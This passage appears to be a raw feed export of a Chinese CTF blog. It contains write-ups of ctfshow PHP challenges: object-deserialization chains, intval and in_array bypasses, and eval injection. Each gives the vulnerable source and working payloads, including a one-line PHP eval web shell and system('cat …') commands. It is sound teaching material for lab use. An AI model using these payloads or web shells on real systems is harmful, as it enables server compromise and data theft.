        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span> <span class="token variable">$ceo</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Pretty Good ! Ctfer!\n"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span><span class="token operator">-></span><span class="token function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>说存在flag.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$leader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'one class'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'ing'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">!=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>成立条件：<code>name=&quot;one class&quot;,leader=&quot;ing&quot;,rank=&quot;department&quot;</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$department</span><span class="token punctuation">,</span><span class="token variable">$ceo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span> <span class="token variable">$ceo</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Pretty Good ! Ctfer!\n"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>成立条件：<code>headmaster=&quot;ong&quot;</code><strong>a传入一个方法，b传入命令</strong>，php内置方法<strong>SplFileObject</strong>可以读取文件，b传入伪协议读取flag.php文件。<br>构造代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// flag.php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span><span class="token string single-quoted-string">'ing'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span><span class="token string single-quoted-string">'one class'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">teacher</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">classroom</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span><span class="token string single-quoted-string">'ong'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">school</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解码得到flag<br><img src="https://img-blog.csdnimg.cn/5ffb75187dbc42149eb9443b38b8d876.png" alt="2"></p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP特性</title>
    <url>/2023/04/07/PHP%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//不让出现字母【a-z】和点【.】。</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//查看数字中是否有0出现，由于开头的零会看成八进制解析。</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>php的intval函数默认值转换是十进制，当数字以0开头时以八进制转换，以0x开头时以十六进制转换。<br>这个题中可以使用八进制（0开头）绕过,十六进制不行（0x开头）。4476转换为八进制为10574。php中+可以当作空格使用。<br>?num&#x3D;+010574</p>
<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">
Notice: Undefined index: flag in /var/www/html/index.php on line 15

Notice: Undefined index: flag in /var/www/html/index.php on line 16

Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 21:39:27
# @link: https://ctfer.com

*/</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//如果存在get方法传入参数，就将get传入参数变为post方法传入参数。</span>
<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//若get(flag)传入的flag，cookie变为“flag”。</span>
<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//若get(flag)传入的flag，SERVER变为“flag”。</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//get(HTTP_FLAG)传入flag，得到flag.php</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ok,get传入随便传参<code>?1=3</code>post传入<code>HTTP_FLAG=flag</code>。得到flag。<br><img src="https://img-blog.csdnimg.cn/162ebf1159144b3c94f25788a35441d6.png" alt="1"></p>
<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 22:36:12
# @link: https://ctfer.com

*/</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置为数组</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//0x36d=877</span>
    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将数组写入$allow（随机数）</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//匹配传入的n值是否在$allow中，存在返回true</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将post传参（content）写入文件</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>payload：<code>?n=1.php</code>in_array存在弱比较漏洞，传入1.php会判断为1。<br>post：<code>content=&lt;? eval($_POST[a]);?&gt;</code>，不行的话多试几次，毕竟是随机匹配。</p>
<h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//flag in class ctfshow;</span>
<span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>涉及到一个知识点<strong>逻辑运算符</strong>，再复习一下：<br><img src="https://img-blog.csdnimg.cn/61e22c6d589646a29eedcc378991996f.png" alt="2"><br><strong>法一</strong><br>payload<code>?v1=1&amp;v2=system(&quot;ls&quot;)/*&amp;v3=;*/;</code><br><code>?v1=1&amp;v2=system(&quot;cat ctfshow*&quot;)/*&amp;v3=;*/;</code>右键查看源码<br><strong>法二</strong><br>采用<strong>php的反射类ReflectionClass</strong><br><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code><br><img src="https://img-blog.csdnimg.cn/61af74a693254f7aa8822b5d01eb4015.png" alt="1"><br>记得把0x2d改成<code>-</code>，最后再加上ctfshow{}。</p>
<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>call_user_func</code>是一个内置函数，它允许你通过函数名字符串调用一个函数或方法。<br>下面是一个使用call_user_func调用一个函数的例子：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">add</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'add'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span> <span class="token comment">// 输出 5</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这个例子中，我们使用call_user_func通过函数名字符串’add’来调用add函数，并传递了参数2和3。<strong>call_user_func</strong>执行了add(2, 3)，返回结果5。</p>
<p>除了函数名字符串之外，$callback还可以是一个包含对象和方法名的数组，或者是一个闭包。<strong>call_user_func</strong>在使用这些类型的回调时与使用函数名字符串的方式是类似的。<br><code>hex2bin() 函数</code>把十六进制值转换为 ASCII 字符<br><code>bin2hex()函数</code>把ASCII 字符转换为 十六进制值<br>本题中传入的v1与$s在函数<code>call_user_func</code>中会调用$s<br>v2要纯数字v3不限</p>
<blockquote>
